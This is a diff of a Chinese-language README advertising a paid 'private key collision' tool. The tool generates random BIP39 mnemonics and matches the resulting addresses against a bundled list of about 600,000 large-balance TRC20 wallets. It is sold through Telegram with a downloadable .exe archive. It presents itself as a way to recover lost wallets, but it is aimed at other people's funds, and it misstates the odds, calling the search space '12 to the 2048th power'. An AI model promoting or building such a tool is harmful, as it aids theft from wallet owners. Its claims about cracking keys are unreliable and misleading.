@@ -1,87 +1,74 @@
 <p align="center">
 	<img alt="logo"  src="./img/logo.png">
 </p>
-<h4 align="center">咸鱼私钥碰撞器</h4>
-<p align="center">寓意：逆境翻盘，咸鱼翻身</p>
+<h4 align="center">咸鱼私钥碰撞器（Trc20）</h4>
+<p align="center">版本：v1.0.0</p>
 <p align="center">
- 	  <img src="https://img.shields.io/badge/助记词-碰撞器-red.svg">
-      <img src="https://img.shields.io/badge/私钥-碰撞器-brightgreen.svg">
-      <img src="https://img.shields.io/badge/助记词-破解-yellow.svg">
-      <img src="https://img.shields.io/badge/私钥-破解-green.svg">
-      <img src="https://img.shields.io/badge/助记词-找回-blue.svg">
-      <img src="https://img.shields.io/badge/私钥-找回-purple.svg">
- </p>
+  <a href="README.md">
+    <img src="https://img.shields.io/badge/-简体中文-red.svg" style="margin:0 5px">
+  </a>
+  <a href="README_zh-TW.md">
+    <img src="https://img.shields.io/badge/-繁体中文-brightgreen.svg" style="margin:0 5px">
+  </a>
+  <a href="README_EN.md">
+    <img src="https://img.shields.io/badge/-English-yellow.svg" style="margin:0 5px">
+  </a>
+  <a href="README_ja.md">
+    <img src="https://img.shields.io/badge/-日本語-green.svg" style="margin:0 5px">
+  </a>
+  <a href="README_ko.md">
+    <img src="https://img.shields.io/badge/-한국어-blue.svg" style="margin:0 5px">
+  </a>
+  <a href="README_es.md">
+    <img src="https://img.shields.io/badge/-Español-purple.svg" style="margin:0 5px">
+  </a>
+</p>
 
 
+<img alt="logo"  src="./img/main_jtzw.png">
 
-##  1.项目简介
+## 项目简介
 
-大家是否经常有看到一些沉睡多年的钱包苏醒异动新闻，往往这些钱包都是早期单价比较低的时候买入忘记助记词了的，这些都是通过助记词碰撞来找回。
+咸鱼私钥碰撞器是一款专注于TRC20（波场链）的私钥碰撞智能系统。该软件通过遵循BIP39协议随机生成12位助记词，并根据生成后的地址与导入的监控地址进行比较，以找回早期低价买入后忘记助记词的TRC20钱包。
 
-本软件通过遵循BIP39协议随机生成12位助记词，然后根据生成后的地址和导入的监控地址比较，如果一样则密钥一样
+## 适用人群
+- 助记词/密钥丢失，需要找回的用户
+- 拥有闲置电脑，希望自动化运行程序的用户
+- 佛系运行者，依赖运气寻找机会的用户
 
-<img alt="logo"  src="./img/bj.png">
+## 软件优势
 
-## 2.适用人群
+1. **专注TRC20**：专为波场链设计，优化了碰撞算法，提高了碰撞效率。
+2. **高效碰撞**：支持大规模并行计算，显著提高碰撞速度。
+3. **用户友好**：简洁直观的用户界面，易于操作，无需专业知识。
+4. **持续更新**：定期更新软件，修复漏洞，增加新功能，保持软件的先进性。
+5. **监控大额钱包**：持续监控大额钱包，及时更新碰撞目标，提高成功率。
+6. **离线运行**：支持离线断网运行，保护用户隐私，避免网络攻击。
+7. **价格优势**：相比市面上的其他碰撞器，价格更加优化，性价比高。
+8. **多语言支持**：支持多种语言界面，满足不同地区用户的需求。
+9. **安全性高**：采用先进的加密技术，保护用户的助记词和私钥安全。
+10. **社区支持**：拥有活跃的社区，用户可以在社区中获取帮助和支持。
 
-1.助记词/密钥丢失，现需要找回
+## 安装步骤
 
-2.有闲置电脑的人群（启动让程序自动运行，无需人工守护）
+1. 下载并解压安装包，[点击这里进行下载](https://github.com/EthCollision/wallet_collission/releases/download/v2.0.0/trx_collision.rar)
+2. 将需要碰撞的钱包地址放入`input`目录(目前自带60w大额钱包地址)
+3. 运行`wallet.exe`启动程序
+4. 运行成功后，【开启】 按钮即可
 
-3.佛系运行者，靠的就是运气
+## 目录结构
 
-大家试想：
-
-一个钱包总共12个助记词，然后每一位助记词都有2048种可能。总数也就是12的2048次方接近宇宙的原子数量了。
-
-按楼主的电脑配置，1秒钟4000次碰撞，一天大概是3.4亿次，虽然离12的2048次方还是差很远。但是至少碰撞了就有机会碰撞上，玩的就是运气。
-
-类似：七星彩大家都知道中奖的概率很低，但是只要购买了才有机会中奖，不然都是纸上谈兵
-
-## 3.安装包
-
-   [点击这里进行下载](https://github.com/EthCollision/wallet_collission/releases/download/v1.0.0/wallet1.0.0.rar)
-
-​    联系客服获取安装包 -》在线客服Telegram：<a href='https://t.me/web3_dev_gg' target="_blank" >咸鱼客服 </a>
-
-​    赠送50w监控地址
-
-## 4.软件优势
-   1、支持 ETH、BSC、BASE、Polygon、OP、Avalanche 等以太坊虚拟机 (EVM) 链
-
-   2、持续不断迭代更新
-
-   3、监控大额钱包持续更新
-
-   4、支持离线断网运行
-
-   5、价格优势，相比市面上的其他碰撞器价格优化很多
-
-## 5.启动步骤
-
-1.data为数据目录
-
-2.input为监控钱包目录。把需要碰撞的钱包放入到input目录即可
-
-3.如果碰撞成功了，data里面的 SUCCESS_WALLET.txt会保存私钥，可以点击模拟成功来测试
-
-4.然后点击 wallet.exe 运行即可
-
-<img alt="logo"  src="./img/mulu.png">
-
-## 6.界面显示
-
-<img alt="logo"  src="./img/jiemian.png">
-
-## 7.联系我们（Telegram）
-
-在线访问：<a href='https://t.me/web3_dev_gg' target="_blank" >咸鱼客服 </a>
-
-<img alt="logo"   src="./img/tg.png">
+- `data`：数据目录，用于存储程序运行过程中的数据
+- `input`：碰撞钱包目录，存放需要碰撞的钱包地址
+- `success`：碰撞成功后的存储目录，存放成功碰撞的钱包信息，SUCCESS_WALLET.txt`会保存助记词
 
 
+## 联系我们
 
+如有任何问题，请联系我们的在线客服：
+- Telegram：[咸鱼客服](https://t.me/web3_dev_gg) <br>
+  <img alt="logo"   src="./img/tg.png">
+## 注意事项
 
-
-
-
+- 助记词碰撞存在一定的风险和不确定性，且可能涉及法律和道德问题。用户在尝试找回钱包时，应充分了解相关风险，并确保自己的行为符合法律法规。
+- 由于网络原因，部分链接可能无法正常访问。请检查链接的合法性，并适当重试。
